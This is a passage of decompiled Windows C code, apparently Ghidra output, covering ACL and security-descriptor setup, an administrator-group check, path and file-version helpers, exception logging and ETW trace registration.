      else if (pcVar3 != pcVar1) goto LAB_00408324;
      local_8[(int)pcVar1] = '\0';
    }
LAB_00408324:
    param_1 = local_c;
    if ((iVar5 != -0x7ff8ff86) || (iVar5 = -0x7ff8ffa9, (char *)0x7ffffffe < pcVar4)) {
      ReleaseBuffer(local_c,-1);
      return iVar5;
    }
    local_10 = (char *)0x7fffffff;
    local_8 = (char *)((int)pcVar4 * 2);
    ppcVar2 = &local_10;
    if ((char *)((int)pcVar4 * 2) < (char *)0x80000000) {
      ppcVar2 = &local_8;
    }
    pcVar4 = *ppcVar2;
    ReleaseBuffer(local_c,-1);
  } while( true );
}



PACL FUN_00408370(void)

{
  DWORD DVar1;
  PACL pAcl;
  BOOL BVar2;
  undefined2 *pAceList;
  PDWORD pDVar3;
  uint _Size;
  PACL pAVar4;
  uint _Size_00;
  
  DVar1 = GetSidLengthRequired('\x01');
  _Size = DVar1 + 8 & 0xffff;
  _Size_00 = _Size + 8 & 0xffff;
  pAcl = (PACL)_malloc(_Size_00);
  if (pAcl != (PACL)0x0) {
    BVar2 = InitializeAcl(pAcl,_Size_00,2);
    if (BVar2 != 0) {
      pAceList = (undefined2 *)_malloc(_Size);
      if (pAceList == (undefined2 *)0x0) {
LAB_00408403:
        pAVar4 = (PACL)0x0;
      }
      else {
        pAceList[1] = (short)_Size;
        *pAceList = 0x11;
        *(undefined4 *)(pAceList + 2) = 1;
        BVar2 = InitializeSid(pAceList + 4,(PSID_IDENTIFIER_AUTHORITY)&DAT_004364d4,'\x01');
        if (BVar2 == 0) goto LAB_00408403;
        pDVar3 = GetSidSubAuthority(pAceList + 4,0);
        *pDVar3 = 0x1000;
        BVar2 = AddAce(pAcl,2,0,pAceList,_Size);
        if (BVar2 == 0) goto LAB_00408403;
        pAVar4 = pAcl;
        pAcl = (PACL)0x0;
      }
      FID_conflict__free(pAceList);
      goto LAB_00408410;
    }
  }
  pAVar4 = (PACL)0x0;
LAB_00408410:
  FID_conflict__free(pAcl);
  return pAVar4;
}



undefined8 FUN_00408420(void)

{
  BOOL BVar1;
  undefined8 uVar2;
  PSID local_18;
  uint local_14;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_c = 0x500;
  local_10 = 0;
  local_18 = (PSID)0x0;
  local_14 = AllocateAndInitializeSid
                       ((PSID_IDENTIFIER_AUTHORITY)&local_10,'\x02',0x20,0x220,0,0,0,0,0,0,&local_18
                       );
  if (local_14 != 0) {
    BVar1 = CheckTokenMembership((HANDLE)0x0,local_18,(PBOOL)&local_14);
    local_14 = local_14 & -(uint)(BVar1 != 0);
    FreeSid(local_18);
  }
  uVar2 = FUN_0041a954();
  return uVar2;
}



DWORD __fastcall FUN_0040849c(undefined4 param_1,void *param_2)

{
  DWORD DVar1;
  PACL pSacl;
  BOOL BVar2;
  undefined8 uVar3;
  undefined **local_24;
  undefined4 local_20;
  undefined local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  uVar3 = FUN_00407d59();
  if ((char)uVar3 == '\0') {
    DVar1 = 1;
  }
  else {
    pSacl = FUN_00408370();
    if (pSacl == (PACL)0x0) {
      DVar1 = FUN_00407e13();
    }
    else {
      DVar1 = 0;
      local_18 = 2;
      local_20 = 0;
      local_1c = 0;
      local_24 = &PTR_FUN_0042feac;
      local_14 = 0;
      local_10 = 0;
      local_c = 0;
      local_8 = 0;
      FUN_0040852d(param_2,(int *)&local_24);
      BVar2 = SetSecurityDescriptorSacl(*(PSECURITY_DESCRIPTOR *)((int)param_2 + 4),1,pSacl,0);
      if (BVar2 == 0) {
        DVar1 = FUN_00407e13();
      }
      else {
        pSacl = (PACL)0x0;
      }
      FUN_00408612(&local_24);
    }
    FID_conflict__free(pSacl);
  }
  return DVar1;
}



void __thiscall FUN_0040852d(void *this,int *param_1)

{
  code *pcVar1;
  BOOL BVar2;
  int iVar3;
  PACL pSacl;
  undefined8 uVar4;
  DWORD DVar5;
  BOOL local_10;
  BOOL local_c;
  PACL local_8;
  
  if (*(int *)((int)this + 4) != 0) {
    FUN_00403da1((int *)this);
  }
  local_8 = (PACL)0x0;
  if (*(int *)((int)this + 4) != 0) {
    BVar2 = GetSecurityDescriptorSacl
                      (*(PSECURITY_DESCRIPTOR *)((int)this + 4),&local_10,&local_8,&local_c);
    if (BVar2 != 0) goto LAB_00408572;
    FUN_00404184();
LAB_00408607:
    DVar5 = 0x8007000e;
    goto LAB_0040860c;
  }
  FUN_00403f34((int)this);
LAB_00408572:
  if (*(char *)(param_1 + 2) == '\0') {
    iVar3 = (**(code **)(*param_1 + 4))();
    if (iVar3 == 0) goto LAB_004085bb;
    uVar4 = FUN_00403f79(param_1);
    pSacl = (PACL)_malloc((size_t)uVar4);
    if (pSacl == (PACL)0x0) goto LAB_00408607;
    FUN_00403fc6(param_1);
    iVar3 = FUN_00423348((size_t)uVar4);
    ATL::AtlCrtErrorCheck(iVar3);
  }
  else {
LAB_004085bb:
    pSacl = (PACL)0x0;
  }
  if ((*(char *)(param_1 + 2) == '\0') && (pSacl == (PACL)0x0)) {
    BVar2 = 0;
  }
  else {
    BVar2 = 1;
  }
  BVar2 = SetSecurityDescriptorSacl(*(PSECURITY_DESCRIPTOR *)((int)this + 4),BVar2,pSacl,0);
  if (BVar2 != 0) {
    FID_conflict__free(local_8);
    return;
  }
  DVar5 = FUN_004042f7();
  FID_conflict__free(pSacl);
LAB_0040860c:
  ATL::AtlThrowImpl(DVar5);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __fastcall FUN_00408612(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042feac;
  FUN_004045bd((int)param_1);
  if (param_1[4] != 0) {
    FUN_004049bc(param_1[4],param_1[5]);
    FID_conflict__free((void *)param_1[4]);
  }
  *param_1 = &PTR_FUN_0042f0fc;
  FID_conflict__free((void *)param_1[1]);
  return;
}



undefined4 * __thiscall FUN_00408649(void *this,byte param_1)

{
  FUN_00408612((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 __thiscall FUN_00408668(void *this,uint param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  
  if (param_1 < *(uint *)((int)this + 0x14)) {
    return *(undefined4 *)(*(int *)((int)this + 0x10) + param_1 * 4);
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



uint __fastcall FUN_00408688(HMODULE param_1,LPCWSTR param_2,void *param_3)

{
  uint uVar1;
  undefined2 extraout_DX;
  int *local_8;
  
  local_8 = (int *)0x0;
  uVar1 = FUN_00406d00(param_1,param_2,1,&local_8,(DWORD *)0x0);
  FUN_00404d7b(param_3,extraout_DX,(int)local_8);
  FID_conflict__free(local_8);
  return uVar1;
}



undefined4 * __fastcall FUN_004086bf(undefined4 *param_1,HMODULE *param_2)

{
  undefined4 *puVar1;
  LPWSTR pszPath;
  int **ppiVar2;
  int extraout_EDX;
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_00404cfa(&local_8,*param_2);
  pszPath = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                              ((CSimpleStringT_char_0_ *)&local_8,local_8[-3]);
  PathStripPathW(pszPath);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  puVar1 = local_8;
  ppiVar2 = FUN_00401aca((int **)(local_8 + -4));
  *param_1 = ppiVar2 + 4;
  FUN_00401df0((int **)(puVar1 + -4));
  return param_1;
}



undefined4 * __fastcall FUN_00408710(undefined4 *param_1,HMODULE *param_2)

{
  undefined4 *puVar1;
  LPWSTR pszPath;
  int **ppiVar2;
  int extraout_EDX;
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_00404cfa(&local_8,*param_2);
  pszPath = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                              ((CSimpleStringT_char_0_ *)&local_8,local_8[-3]);
  PathRemoveFileSpecW(pszPath);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  puVar1 = local_8;
  ppiVar2 = FUN_00401aca((int **)(local_8 + -4));
  *param_1 = ppiVar2 + 4;
  FUN_00401df0((int **)(puVar1 + -4));
  return param_1;
}



undefined4 * __fastcall FUN_00408761(undefined4 *param_1,HMODULE *param_2)

{
  undefined4 *puVar1;
  LPWSTR pszPath;
  int **ppiVar2;
  int extraout_EDX;
  undefined4 *local_8;
  
  local_8 = param_1;
  FUN_00404cfa(&local_8,*param_2);
  pszPath = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                              ((CSimpleStringT_char_0_ *)&local_8,local_8[-3]);
  PathRemoveExtensionW(pszPath);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  puVar1 = local_8;
  ppiVar2 = FUN_00401aca((int **)(local_8 + -4));
  *param_1 = ppiVar2 + 4;
  FUN_00401df0((int **)(puVar1 + -4));
  return param_1;
}



void __fastcall FUN_004087b2(int *param_1)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  
  if (*(int *)(*param_1 + -0xc) != 0) {
    uVar2 = FUN_00407b0e(param_1,0);
    iVar3 = *(int *)(*param_1 + -0xc) + -1;
    if (iVar3 < 0) {
      ATL::AtlThrowImpl(-0x7ff8ffa9);
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
    uVar4 = FUN_00407b0e(param_1,iVar3);
    if (((short)uVar2 != 0x22) || ((short)uVar4 != 0x22)) {
      FUN_00408809(param_1);
      ATL::CSimpleStringT<wchar_t,0>::AppendChar((CSimpleStringT_wchar_t_0_ *)param_1,0x22);
    }
  }
  return;
}



int __fastcall FUN_00408809(int *param_1)

{
  undefined2 *puVar1;
  unsigned_int uVar2;
  char *pcVar3;
  int iVar4;
  int iVar5;
  
  iVar5 = *(int *)(*param_1 + -0xc);
  iVar4 = 0;
  if (iVar5 < 0) {
    iVar4 = iVar5;
  }
  iVar5 = iVar5 + 1;
  pcVar3 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)param_1,iVar5);
  uVar2 = (iVar5 - iVar4) * 2;
  puVar1 = (undefined2 *)(pcVar3 + iVar4 * 2);
  ATL::Checked::memmove_s(puVar1 + 1,uVar2,puVar1,uVar2);
  *puVar1 = 0x22;
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,iVar5);
  return iVar5;
}



void __fastcall FUN_00408850(int *param_1)

{
  FUN_004088af(*(int **)(*param_1 + 4));
  *(int *)(*param_1 + 4) = *param_1;
  *(int *)*param_1 = *param_1;
  *(int *)(*param_1 + 8) = *param_1;
  param_1[1] = 0;
  return;
}



int * __fastcall FUN_00408871(int *param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  undefined8 uVar4;
  undefined4 uVar5;
  
  uVar5 = 0x18;
  *param_1 = 0;
  param_1[1] = 0;
  uVar4 = FUN_00416f82(0x18);
  iVar2 = (int)uVar4;
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    *param_1 = iVar2;
    return param_1;
  }
  FUN_00422e78(uVar5,(int)((ulonglong)uVar4 >> 0x20));
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



void FUN_004088af(int *param_1)

{
  char cVar1;
  int *piVar2;
  
  cVar1 = *(char *)((int)param_1 + 0xd);
  while (cVar1 == '\0') {
    FUN_004088af((int *)param_1[2]);
    piVar2 = (int *)*param_1;
    FUN_00401df0((int **)(param_1[5] + -0x10));
    FUN_00401df0((int **)(param_1[4] + -0x10));
    FID_conflict__free(param_1);
    param_1 = piVar2;
    cVar1 = *(char *)((int)piVar2 + 0xd);
  }
  return;
}



void __thiscall FUN_004088fa(void *this,int *param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  
  ppiVar1 = (int **)param_1[2];
  param_1[2] = (int)*ppiVar1;
  if (*(char *)((int)*ppiVar1 + 0xd) == '\0') {
    (*ppiVar1)[1] = (int)param_1;
  }
  ppiVar1[1] = (int *)param_1[1];
                    // WARNING: Load size is inaccurate
  if (param_1 == *(int **)(*this + 4)) {
    *(int ***)(*this + 4) = ppiVar1;
  }
  else {
    ppiVar2 = (int **)param_1[1];
    if (param_1 == *ppiVar2) {
      *ppiVar2 = (int *)ppiVar1;
    }
    else {
      ppiVar2[2] = (int *)ppiVar1;
    }
  }
  *ppiVar1 = param_1;
  param_1[1] = (int)ppiVar1;
  return;
}



void __thiscall FUN_0040893e(void *this,int *param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = *param_1;
  *param_1 = *(int *)(iVar1 + 8);
  if (*(char *)(*(int *)(iVar1 + 8) + 0xd) == '\0') {
    *(int **)(*(int *)(iVar1 + 8) + 4) = param_1;
  }
  *(int *)(iVar1 + 4) = param_1[1];
                    // WARNING: Load size is inaccurate
  if (param_1 == *(int **)(*this + 4)) {
    *(int *)(*this + 4) = iVar1;
  }
  else {
    piVar2 = (int *)param_1[1];
    if (param_1 == (int *)piVar2[2]) {
      piVar2[2] = iVar1;
    }
    else {
      *piVar2 = iVar1;
    }
  }
  *(int **)(iVar1 + 8) = param_1;
  param_1[1] = iVar1;
  return;
}



undefined4 __thiscall FUN_00408984(void *this,LPCWSTR param_1)

{
  DWORD dwLen;
  LPVOID lpData;
  BOOL BVar1;
  undefined4 extraout_ECX;
  int extraout_EDX;
  DWORD local_10;
  undefined2 *local_c;
  uint local_8;
  
  dwLen = GetFileVersionInfoSizeW(param_1,&local_10);
  if (dwLen != 0) {
    lpData = (LPVOID)FUN_00423836(extraout_ECX,extraout_EDX);
    *(LPVOID *)this = lpData;
    if (lpData != (LPVOID)0x0) {
      BVar1 = GetFileVersionInfoW(param_1,local_10,dwLen,lpData);
      if (BVar1 == 0) {
                    // WARNING: Load size is inaccurate
        FID_conflict__free(*this);
      }
      else {
        local_8 = 0;
                    // WARNING: Load size is inaccurate
        local_c = (undefined2 *)0x0;
        BVar1 = VerQueryValueW(*this,L"\\VarFileInfo\\Translation",&local_c,&local_8);
        if ((BVar1 != 0) && (local_8 != 0)) {
          *(uint *)((int)this + 4) = CONCAT22(*local_c,local_c[1]);
          return 1;
        }
                    // WARNING: Load size is inaccurate
        FID_conflict__free(*this);
      }
      *(undefined4 *)((int)this + 4) = 0;
      *(undefined4 *)this = 0;
    }
  }
  return 0;
}



undefined4 __thiscall FUN_00408a1f(void *this,undefined4 *param_1)

{
  undefined4 uVar1;
  BOOL BVar2;
  int iVar3;
  undefined4 *local_c;
  uint local_8;
  
                    // WARNING: Load size is inaccurate
  if (*this == 0) {
    uVar1 = 0;
  }
  else {
    local_8 = 0;
    local_c = (undefined4 *)0x0;
                    // WARNING: Load size is inaccurate
    BVar2 = VerQueryValueW(*this,L"\\",&local_c,&local_8);
    if (((BVar2 == 0) || (local_8 == 0)) || (local_c == (undefined4 *)0x0)) {
      uVar1 = 0;
    }
    else {
      for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {
        *param_1 = *local_c;
        local_c = local_c + 1;
        param_1 = param_1 + 1;
      }
      uVar1 = 1;
    }
  }
  return uVar1;
}



undefined8 __fastcall FUN_00408a74(void *param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 local_38;
  uint local_34 [3];
  undefined4 local_28;
  undefined4 local_24;
  
  FUN_00416e80(local_34,0,0x30);
  iVar1 = FUN_00408a1f(param_1,&local_38);
  uVar2 = 0;
  uVar3 = 0;
  if (iVar1 != 0) {
    uVar2 = local_28;
    uVar3 = local_24;
  }
  return CONCAT44(uVar2,uVar3);
}



void FUN_00408aea(void)

{
  return;
}



undefined4 __fastcall FUN_00408aeb(int param_1,undefined4 param_2)

{
  BOOL BVar1;
  undefined4 uVar2;
  
  if ((param_1 != -0x7ffffffd) && (BVar1 = IsDebuggerPresent(), BVar1 == 0)) {
    OutputDebugStringW(L"**SehSendMinidump**\r\n");
    if (DAT_00437b80 != (int *)0x0) {
      uVar2 = (**(code **)(*DAT_00437b80 + 4))(param_1,param_2,600000000,0);
      return uVar2;
    }
    return 1;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

LPWSTR __fastcall FUN_00408b32(undefined4 param_1,int param_2,LPCWSTR param_3)

{
  int iVar1;
  int *piVar2;
  int extraout_EDX;
  LPWSTR pWVar3;
  
  while( true ) {
    LOCK();
    iVar1 = DAT_00437b8c;
    if (DAT_00437b8c == 0) {
      DAT_00437b8c = 1;
      iVar1 = 0;
    }
    if (iVar1 != 1) break;
    Sleep(0);
    param_2 = extraout_EDX;
  }
  DAT_00437b88 = DAT_00437b88 + 1;
  if (2 < DAT_00437b88) {
    DAT_00437b88 = 0;
  }
  pWVar3 = (LPWSTR)0x0;
  if (DAT_00437b6a == '\0') {
    iVar1 = FUN_00423836(1,param_2);
    DAT_00437b84 = iVar1;
    if (iVar1 == 0) goto LAB_00408c00;
    piVar2 = &DAT_00438840;
    do {
      *piVar2 = iVar1;
      iVar1 = iVar1 + 0x806;
      piVar2 = piVar2 + 1;
    } while ((int)piVar2 < 0x43884c);
    DAT_00437b6a = '\x01';
  }
  pWVar3 = (LPWSTR)(&DAT_00438840)[DAT_00437b88];
  wvsprintfW(pWVar3,param_3,&stack0x00000008);
LAB_00408c00:
  LOCK();
  DAT_00437b8c = DAT_00437b8c + -1;
  return pWVar3;
}



undefined4 __fastcall FUN_00408c0f(undefined4 param_1,undefined4 param_2)

{
  code *pcVar1;
  int iVar2;
  undefined4 uVar3;
  undefined8 uVar4;
  int local_810;
  WCHAR local_80c;
  uint local_80a [512];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_80c = L'\0';
  FUN_00416e80(local_80a,0,0x800);
  uVar3 = DAT_00437e14;
  FUN_00404e52(&local_810,(HMODULE)0x0);
  wsprintfW(&local_80c,L"Exception %x in %s %s %u\r\n\r\n%hs:%d\r\n",param_1,local_810,uVar3,0,
            "base\\logging.cc",param_2);
  FUN_00401df0((int **)(local_810 + -0x10));
  FUN_004093bf(&local_80c);
  iVar2 = MessageBoxW((HWND)0x0,&local_80c,L"Exception",0x250012);
  if (iVar2 == 3) {
                    // WARNING: Subroutine does not return
    ExitProcess(0xffffffff);
  }
  if (iVar2 == 4) {
    pcVar1 = (code *)swi(3);
    uVar3 = (*pcVar1)();
    return uVar3;
  }
  uVar4 = FUN_0041a954();
  return (int)uVar4;
}



undefined4 * __fastcall FUN_00408cd4(undefined4 *param_1)

{
  undefined4 *puVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  uint uVar3;
  int extraout_ECX;
  int extraout_ECX_00;
  int iVar4;
  uint extraout_EDX;
  uint extraout_EDX_00;
  
  *param_1 = &PTR_LAB_0042fa90;
  puVar1 = param_1 + 2;
  *puVar1 = &PTR_FUN_004300e8;
  param_1[4] = 0x9b18bff9;
  param_1[5] = 0x4cc1915e;
  param_1[6] = 0xacf43e9c;
  param_1[7] = 0x6cb32c11;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0;
  *(undefined *)(param_1 + 0xd) = 0;
  *param_1 = &PTR_LAB_0042ffd0;
  *puVar1 = &PTR_LAB_0042ffc4;
  param_1[0xe] = 0;
  hModule = GetModuleHandleW(L"kernel32.dll");
  iVar4 = extraout_ECX;
  uVar3 = extraout_EDX;
  if (hModule != (HMODULE)0x0) {
    pFVar2 = GetProcAddress(hModule,"RtlCaptureStackBackTrace");
    param_1[0xe] = pFVar2;
    iVar4 = extraout_ECX_00;
    uVar3 = extraout_EDX_00;
  }
  uVar3 = FUN_00420d58(iVar4,uVar3);
  if (uVar3 != 0) {
    RegisterTraceGuidsW(FUN_004094cd,puVar1,param_1 + 4,1,&PTR_DAT_00436530,0,0,param_1 + 8);
  }
  return param_1;
}



undefined4 * __thiscall FUN_00408d82(void *this,byte param_1)

{
  *(undefined4 *)((int)this + 8) = &PTR_FUN_004300e8;
  FUN_004094e2((int)(undefined4 *)((int)this + 8));
  *(undefined ***)this = &PTR_LAB_0042fa90;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 FUN_00408dc4(void)

{
  return 0;
}



uint __thiscall FUN_00408dc7(void *this,char param_1,int param_2)

{
  undefined3 in_stack_00000005;
  
  if (((*(uint *)((int)this + 0x30) & 1 << (param_1 + 1U & 0x1f)) != 0) &&
     (_param_1 = FUN_00408ffb(param_2), (byte)_param_1 <= *(byte *)((int)this + 0x34))) {
    return CONCAT31((int3)(_param_1 >> 8),1);
  }
  return _param_1 & 0xffffff00;
}



undefined8 __thiscall FUN_00408df5(void *this,undefined4 *param_1)

{
  char cVar1;
  undefined8 uVar2;
  uint uVar3;
  undefined4 *puStack276;
  int iStack272;
  undefined *puStack268;
  void *local_108;
  undefined uStack260;
  byte bStack259;
  undefined4 uStack240;
  undefined4 uStack236;
  undefined4 uStack232;
  undefined4 uStack228;
  undefined4 uStack220;
  undefined *puStack216;
  undefined4 uStack212;
  undefined4 uStack208;
  undefined4 *puStack200;
  undefined4 uStack196;
  int iStack192;
  undefined *puStack184;
  undefined4 uStack180;
  undefined4 uStack176;
  undefined4 *puStack168;
  undefined4 uStack164;
  int iStack160;
  undefined4 uStack152;
  uint auStack148 [34];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&puStack276;
                    // WARNING: Load size is inaccurate
  local_108 = this;
  cVar1 = (**(code **)(*this + 0xc))(*param_1,param_1[1]);
  if (cVar1 == '\0') goto LAB_00408fe4;
  FUN_0040902a(&puStack268,(LPCWSTR)param_1[2]);
  FUN_0040902a(&puStack276,(LPCWSTR)param_1[3]);
  bStack259 = FUN_00408ffb(param_1[1]);
  if ((*(byte *)((int)this + 0x30) & 1) == 0) {
    FUN_00416e80((uint *)&local_108,0,0x50);
    local_108 = (void *)((uint)local_108 & 0xffff0000 | 0x50);
    uStack240 = 0x7fe69228;
    uStack236 = 0x4f06633e;
    uStack232 = 0x7f52c180;
    uStack228 = 0xa7e323ea;
    uStack260 = 10;
    uStack220 = 0x120000;
    uStack208 = *(undefined4 *)(puStack268 + -0xc);
    puStack216 = puStack268;
    uStack212 = 0;
    iStack192 = puStack276[-3] + 1;
    puStack200 = puStack276;
    uStack196 = 0;
    if (bStack259 <= *(byte *)(iStack272 + 0x34)) goto LAB_00408fc7;
  }
  else {
    uStack152 = 0;
    FUN_00416e80(auStack148,0,0x7c);
    uVar3 = 0;
    if (*(code **)((int)this + 0x38) != (code *)0x0) {
      uVar3 = (**(code **)((int)this + 0x38))(0,0x20,&uStack152,0);
      uVar3 = uVar3 & 0xffff;
    }
    FUN_00416e80((uint *)&local_108,0,0x70);
    local_108 = (void *)((uint)local_108 & 0xffff0000 | 0x70);
    puStack216 = &stack0xfffffee8;
    uStack240 = 0x7fe69228;
    uStack236 = 0x4f06633e;
    uStack232 = 0x7f52c180;
    uStack228 = 0xa7e323ea;
    iStack192 = uVar3 << 2;
    uStack260 = 0xb;
    uStack220 = 0x120000;
    uStack212 = 0;
    uStack208 = 4;
    puStack200 = &uStack152;
    uStack196 = 0;
    uStack176 = *(undefined4 *)(puStack268 + -0xc);
    puStack184 = puStack268;
    uStack180 = 0;
    iStack160 = puStack276[-3] + 1;
    puStack168 = puStack276;
    uStack164 = 0;
    if (bStack259 <= *(byte *)(iStack272 + 0x34)) {
LAB_00408fc7:
      uStack196 = 0;
      uStack212 = 0;
      uStack220 = 0x120000;
      uStack228 = 0xa7e323ea;
      uStack232 = 0x7f52c180;
      uStack236 = 0x4f06633e;
      uStack240 = 0x7fe69228;
      TraceEvent(*(undefined4 *)(iStack272 + 0x28),*(undefined4 *)(iStack272 + 0x2c),&local_108);
    }
  }
  FUN_00401df0((int **)(puStack276 + -4));
  FUN_00401df0((int **)(puStack268 + -0x10));
LAB_00408fe4:
  uVar2 = FUN_0041a954();
  return uVar2;
}



undefined __fastcall FUN_00408ffb(int param_1)

{
  if (param_1 == -3) {
    return 1;
  }
  if (param_1 == -2) {
    return 2;
  }
  if (param_1 == -1) {
    return 3;
  }
  if (0 < param_1) {
    if (param_1 < 3) {
      return 4;
    }
    if (param_1 < 7) {
      return 5;
    }
  }
  return 0;
}



void * __thiscall FUN_0040902a(void *this,LPCWSTR param_1)

{
  int *piVar1;
  HMODULE pHVar2;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(this,piVar1);
  if ((param_1 == (LPCWSTR)0x0) || (((uint)param_1 & 0xffff0000) != 0)) {
    FUN_00409075(this,param_1);
  }
  else {
    pHVar2 = FUN_00404b19((uint)param_1 & 0xffff);
    if (pHVar2 != (HMODULE)0x0) {
      FUN_004090d3(this,pHVar2,(uint)param_1 & 0xffff);
    }
  }
  return this;
}



int * __thiscall FUN_00409075(void *this,LPCWSTR param_1)

{
  int iVar1;
  char *lpMultiByteStr;
  
  if (param_1 == (LPCWSTR)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = WideCharToMultiByte(3,0,param_1,-1,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    iVar1 = iVar1 + -1;
  }
  if (iVar1 < 1) {
    FUN_00407a7b((int *)this);
  }
  else {
    lpMultiByteStr = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,iVar1)
    ;
    WideCharToMultiByte(3,0,param_1,-1,lpMultiByteStr,iVar1,(LPCSTR)0x0,(LPBOOL)0x0);
    ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)this,iVar1);
  }
  return (int *)this;
}



ushort * __thiscall FUN_004090d3(void *this,HMODULE param_1,uint param_2)

{
  ushort *puVar1;
  int cbMultiByte;
  char *lpMultiByteStr;
  
  puVar1 = (ushort *)FUN_00404bdf(param_1,param_2);
  if (puVar1 != (ushort *)0x0) {
    cbMultiByte = WideCharToMultiByte(3,0,(LPCWSTR)(puVar1 + 1),(uint)*puVar1,(LPSTR)0x0,0,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
    lpMultiByteStr =
         ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,cbMultiByte);
    WideCharToMultiByte(3,0,(LPCWSTR)(puVar1 + 1),(uint)*puVar1,lpMultiByteStr,cbMultiByte,
                        (LPCSTR)0x0,(LPBOOL)0x0);
    ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)this,cbMultiByte);
    puVar1 = (ushort *)0x1;
  }
  return puVar1;
}



void __fastcall
FUN_00409145(int **param_1,uint param_2,undefined4 *param_3,undefined4 param_4,int *param_5,
            int **param_6)

{
  char cVar1;
  int **ppiVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  int iVar5;
  int **extraout_ECX;
  int **extraout_ECX_00;
  uint extraout_EDX;
  int **ppiVar6;
  undefined8 uVar7;
  bool local_c;
  int **local_8;
  
  local_c = true;
  ppiVar2 = (int **)(*param_1)[1];
  cVar1 = *(char *)((int)ppiVar2 + 0xd);
  ppiVar3 = (int **)*param_1;
  ppiVar6 = param_1;
  while (cVar1 == '\0') {
    local_8 = ppiVar6;
    uVar7 = FUN_00407c33(param_5,param_2,(int)ppiVar2[4]);
    param_2 = (uint)((ulonglong)uVar7 >> 0x20);
    local_c = (int)uVar7 < 0;
    if (local_c) {
      ppiVar6 = (int **)*ppiVar2;
    }
    else {
      ppiVar6 = (int **)ppiVar2[2];
    }
    cVar1 = *(char *)((int)ppiVar6 + 0xd);
    ppiVar3 = ppiVar2;
    ppiVar2 = ppiVar6;
    param_1 = extraout_ECX;
    ppiVar6 = local_8;
  }
  local_8 = ppiVar3;
  if (local_c) {
    if (ppiVar3 == (int **)**ppiVar6) {
      local_c = true;
      goto LAB_004091a3;
    }
    FUN_00409256((int **)&local_8);
    param_2 = extraout_EDX;
  }
  ppiVar2 = local_8;
  iVar5 = FUN_00407c33(local_8 + 4,param_2,*param_5);
  param_1 = extraout_ECX_00;
  if (-1 < iVar5) {
    FUN_004091f8(param_6);
    *param_3 = ppiVar2;
    *(undefined *)(param_3 + 1) = 0;
    return;
  }
LAB_004091a3:
  puVar4 = (undefined4 *)FUN_0040929a(ppiVar6,(int **)&param_6,local_c,ppiVar3,param_1,param_6);
  *param_3 = *puVar4;
  *(undefined *)(param_3 + 1) = 1;
  return;
}



void FUN_004091f8(void *param_1)

{
  FUN_00401df0((int **)(*(int *)((int)param_1 + 0x14) + -0x10));
  FUN_00401df0((int **)(*(int *)((int)param_1 + 0x10) + -0x10));
  FID_conflict__free(param_1);
  return;
}



undefined4 * __fastcall FUN_00409221(undefined4 *param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  uVar3 = 0x18;
  puVar2 = (undefined4 *)FUN_00416f82(0x18);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    if (puVar2 + 1 != (undefined4 *)0x0) {
      puVar2[1] = *param_1;
    }
    if (puVar2 + 2 != (undefined4 *)0x0) {
      puVar2[2] = *param_1;
    }
    return puVar2;
  }
  FUN_00422e78(uVar3,0);
  pcVar1 = (code *)swi(3);
  puVar2 = (undefined4 *)(*pcVar1)();
